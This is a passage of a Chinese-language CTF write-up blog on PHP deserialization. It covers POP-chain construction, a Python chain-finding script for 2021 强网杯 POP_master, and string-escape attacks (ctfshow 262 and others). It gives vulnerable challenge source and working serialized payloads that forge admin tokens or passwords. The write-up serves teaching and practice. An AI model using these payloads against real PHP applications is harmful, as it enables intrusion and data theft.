class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//hint is in hint.php</span><br>error_reporting(<span class="hljs-number">1</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I think you need /etc/hint . Before this you need to see the source code&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_sayhello</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hi&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_sayhello();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$cc</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;give you flag : &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;flag;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$phonenumber</span> = <span class="hljs-number">123123</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$promise</span> = <span class="hljs-string">&#x27;I do&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;promise = <span class="hljs-string">&#x27;I will not !!!!&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;promise;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="hljs-string">&#x27;ffiilleennaammee&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Room</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sth_to_set</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_hint</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$hint</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$hint</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-keyword">$this</span>-&gt;Get_hint(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>])) &#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$hi</span> = <span class="hljs-keyword">new</span> Start();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Start();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Info();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$c</span>-&gt;a = <span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$b</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>] = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><h4 id="2021-强网杯-POP-master："><a href="#2021-强网杯-POP-master：" class="headerlink" title="2021 强网杯 POP_master："></a>2021 强网杯 POP_master：</h4><p><a href="https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php">https://raw.githubusercontent.com/ZimuWu/C/main/pop2.php</a></p><p>脚本找链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><span class="hljs-keyword">from</span> phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pprint<br><span class="hljs-keyword">import</span> nose<br><br>parser = make_parser()<br>func_name = <span class="hljs-string">&quot;find your func&quot;</span><br>con = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./qwb/class.php&quot;</span>).read()<br>lexer = phplex.lexer.clone()<br>lexer.filename = <span class="hljs-literal">None</span><br>output = parser.parse(con, lexer=lexer)<br>functions = &#123;&#125;<br>target = functions[func_name] i = <span class="hljs-number">0</span><br><span class="hljs-comment"># 强赋值函数直接跳过</span><br>skip_func = []<br>pop_chain = []<br>pop_chain.append(func_name) e = <span class="hljs-literal">False</span><br><span class="hljs-keyword">for</span> out <span class="hljs-keyword">in</span> output:<br>class_name = out.name<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> out.nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>functions[node.name] = out<br><span class="hljs-keyword">while</span>(e <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>):<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> target.nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br><span class="hljs-keyword">if</span> node.name == func_name:<br><span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode) == MethodCall:<br><span class="hljs-comment"># print(subnode)</span><br><span class="hljs-keyword">if</span>(subnode.name <span class="hljs-keyword">in</span> skip_func):<br><span class="hljs-keyword">continue</span><br>target = functions[subnode.name]<br>func_name = subnode.name<br>pop_chain.append(func_name)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == If):<br><span class="hljs-comment"># print(subnode)</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode.node) == MethodCall :<br><span class="hljs-comment"># print(subnode.node.name)</span><br><span class="hljs-keyword">if</span>( subnode.node.name <span class="hljs-keyword">in</span> skip_func):<br><span class="hljs-keyword">continue</span><br>target = functions[subnode.node.name]<br>func_name = subnode.node.name<br>pop_chain.append(func_name)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == Eval):<br>e = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> pop <span class="hljs-keyword">in</span> pop_chain:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;class &quot;</span> + functions[pop].name + <span class="hljs-string">&quot;&#123;&quot;</span>)<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> functions[pop].nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == ClassVariables):<br><span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public &quot;</span> + subnode.name + <span class="hljs-string">&#x27;;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public function __construct()&#123;&quot;</span>)<br><span class="hljs-keyword">if</span> i+<span class="hljs-number">1</span> == <span class="hljs-built_in">len</span>(pop_chain):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;$this-&gt;&quot;</span> + subnode.name[<span class="hljs-number">1</span>:] + <span class="hljs-string">&quot;= new &quot;</span> +<br>functions[pop_chain[i+<span class="hljs-number">1</span>]].name + <span class="hljs-string">&quot;();&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>i += <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(pop_chain):<br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><p>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。如下图，out!并不会被序列化</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210720135305824.png"></p><p>当某个属性的字符串长度不一致时也不会被序列化成功</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210720135505974.png"></p><h3 id="增多："><a href="#增多：" class="headerlink" title="增多："></a>增多：</h3><ul><li>ctfshow 262</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> message(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$msg</span>));<br>    setcookie(<span class="hljs-string">&#x27;msg&#x27;</span>,base64_encode(<span class="hljs-variable">$umsg</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>前面注释发现有个<code>message.php</code> ,访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><p>把 base64 编码后的结果放到 cookie 里面访问 message.php 就能拿到 flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> message(a,b,<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$c</span>));<br><span class="hljs-keyword">echo</span> base64_encode(<span class="hljs-variable">$umsg</span>);<br></code></pre></td></tr></table></figure><p>或者直接在 index.php 传值</p><blockquote><p>f=a&amp;m=b&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck”;s:5:”token”;s:5:”admin”;}</p></blockquote><p>访问 message.php</p><ul><li>某校的一题</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;secured&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题步骤：</p><p>首先得到序列化的字符串<code>O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Marble&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p><p>截取需要逃逸的字符串<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p><p>长度为 31，secure 全部替换为 secured，字符串+1，则需要<code>31</code>个 secure 把目标字符串顶出去</p><p>payload：</p><blockquote><p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure”;s:8:”password”;s:6:”hacker”;}&amp;password=</p></blockquote><p>题目改一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;securing&#x27;</span>, <span class="hljs-variable">$str</span>);<br><br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;love&#x27;</span>, <span class="hljs-string">&#x27;lover&#x27;</span>, <span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见此处 secure 变为了 secure，love 变为 lover</p><p>仍然要逃逸 31 个字符，当然可以 31 个 love，直接可以逃逸，但是也可以构造 15 个 secure 和一个 love</p><p>payload：</p><blockquote><p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecurelove”;s:8:”password”;s:6:”hacker”;}&amp;password=1</p></blockquote><h3 id="减少："><a href="#减少：" class="headerlink" title="减少："></a>减少：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 